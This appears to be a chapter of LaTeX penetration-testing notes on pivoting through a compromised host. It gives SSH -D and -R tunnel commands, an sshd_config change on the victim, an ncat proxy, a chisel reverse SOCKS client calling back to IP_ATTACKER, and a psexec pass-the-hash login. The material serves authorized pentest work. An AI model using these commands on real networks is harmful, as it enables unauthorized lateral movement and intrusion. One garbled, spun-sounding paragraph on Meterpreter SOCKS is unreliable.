\chapter{Pivoting}
Pivoting is otherwise called island bouncing.


Port forwarding has a limitation: it’s a static operation, and you have to do a separate forwarding for each ip:port combination. Normally, you need this only at the initial stage to bypass the firewall. But if you need a fully functional and handy access to a network segment via the compromised PC, you have to use a proxy.

\input{misc/pivoting/port-forwarding}
\section{Proxy pivoting}
\subsection{SOCKS proxy and Meterpreter}
Like SSH, meterpreter can turn into a sock intermediary, it has been discovered that it is less reliable than SSH. Shockingly, socks4 proxies just for the most part support TCP conventions, and specific sorts of traffic won’t function admirably, so full Nmap and comparative tools utilization may not be conceivable.

\subsection{ssh}
\subsubsection{SSH Dynamic Port Forwarding}

Allows you to create a socket on the local (ssh client) machine, which acts as a SOCKS proxy server. When a client connects to this port, the connection is forwarded to the remote (ssh server) machine, which is then forwarded to a dynamic port on the destination machine.

How to set it up:
\begin{enumerate}
    \item Edit \verb+/etc/proxychains.conf+ and implement the following:
        \begin{itemize}
         \item Remove Dynamic chain from comment.
        \item Comment Strict chain and Random chain.
        \item Append line \verb+socks4 127.0.0.1 9050+ at the end of the
            document (proxy list), save and close file. 
        \end{itemize}
    \item  Setup the SSH Dynamic Port Forwarding:
        \begin{verbatim}
ssh -D 127.0.0.1:9050 user@victim-IP
        \end{verbatim}
\end{enumerate}
Usage examples:
With x.x.x.x being the ip address of a host that belongs to the tunneled network:
\begin{verbatim}
proxychains nmap -sT -Pn -p- x.x.x.x
proxychains smbmap -H x.x.x.x
proxychains ssh user@x.x.x.x
\end{verbatim}

In order to use firefox throught the tunnel:

proxychains firefox

\subsubsection{SSH Remote Port Forwarding}

If you are searching how to get a reverse shell through a pivot tunnel, this is what you need. It allows you to forward a port on the remote (victim) machine to a port on the local (attacker) machine.

How to set it up:

\begin{enumerate}
    \item SSH into the victim machine.

    \item Edit \verb+/etc/ssh/sshd_config+ and implement the following:
        \begin{itemize}
            \item Remove GatewayPorts no from comment and change it to Yes. Save and close file. This is very important and many guides around the web do not mention it. If you don't do this you will only be able to set the tunnel on 127.0.0.1 rather than 0.0.0.0, which will end up not forwarding traffic when it originates from any host except localhost.
            \item Restart the SSH service for changes to be effective. sudo service ssh restart
        \end{itemize}
    \item Setup the SSH Remote Port Forwarding:
    Essentially, after setting it up as mentioned, the command is as simple as
    that:\verb+ ssh -R 2222:*:2222 user@victim-IP+
\end{enumerate}

In order to test if it works, you could do the following:
Set a listener (e.g. netcat) on your attacker machine (on the port you configured the remote forward, in this example 2222) and make a request from the victim machine to itself (localhost). In this example, that would be nc 127.0.0.1 2222. If your attacker machine receives the connection then it means that a) it works and b) every connection from pivoting hosts to the victimip:2222 will be forwarded to attacker machine.

You can set multiple ports like this:
\verb+ssh -R 2222:*:2222 -R 3333:*:3333 user@victim-IP+

\subsection{ Tunnel as http (socks5) proxy with ncat}

ncat can be setup as an http proxy which can be used similar to a socks proxy. Just run the ncat proxy on the target machine, and update the local proxychains config to use an http proxy.

Unfortunately, ncat is almost never going to be installed by default on a target machine, unless someone has also installed nmap there.
\subsubsection{Target machine - setup ncat listener}
\begin{verbatim}
ncat -vv --listen 3128 --proxy-type http # or socks5
\end{verbatim}
\subsubsection{attacker machine}
\begin{verbatim}
tail /etc/proxychains.conf -n 3
# defaults set to "tor"
#socks4 	127.0.0.1 9050
http 172.21.0.3  3128 # 172.21.0.3 is the IP of my ssh machine

proxychains nmap -sT -P0 -p8080,9001 172.20.0.2
\end{verbatim}

\subsection{chisel proxy}
\url{https://ppn.snovvcrash.rocks/pentest/infrastructure/pivoting#chisel}

\url{https://ap3x.github.io/posts/pivoting-with-chisel/}

on the attacker
\begin{verbatim}
chisel server -p 8001 --reverse
\end{verbatim}

edit \verb+/etc/proxych+ to happen \verb+ socks5   127.0.0.1:1080+

on the pivot

\begin{verbatim}
create a reverse proxy and open port 1080 on attacker
chisel client IP_ATTACKER:8001 R:socks
\end{verbatim}

on the attacker:
proxychains nmap\ldots
\begin{verbatim}
proxychains4 psexec.py -hashes 00000000000000000000000000000000:27dedb1dab4d8545c6e1c66fba077da0 Administrator@172.16.6.3
\end{verbatim}


\section{VPN pivoting}

\section{links}
\url{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md}
\url{https://hackmag.com/security/windows-pivoting/}
\url{https://salmonsec.com/cheatsheet/network_pivoting}
\url{https://www.orangecyberdefense.com/fr/insights/blog/ethical-hacking/etat-de-lart-du-pivoting-reseau-en-2019}
\url{https://miloserdov.org/?p=2973}
\url{https://hackmag.com/security/windows-pivoting/}
\url{https://salmonsec.com/cheatsheet/network_pivoting}
\url{https://archive.ph/LnvIQ#selection-2127.0-2127.46}
\url{https://artkond.com/2017/03/23/pivoting-guide/}
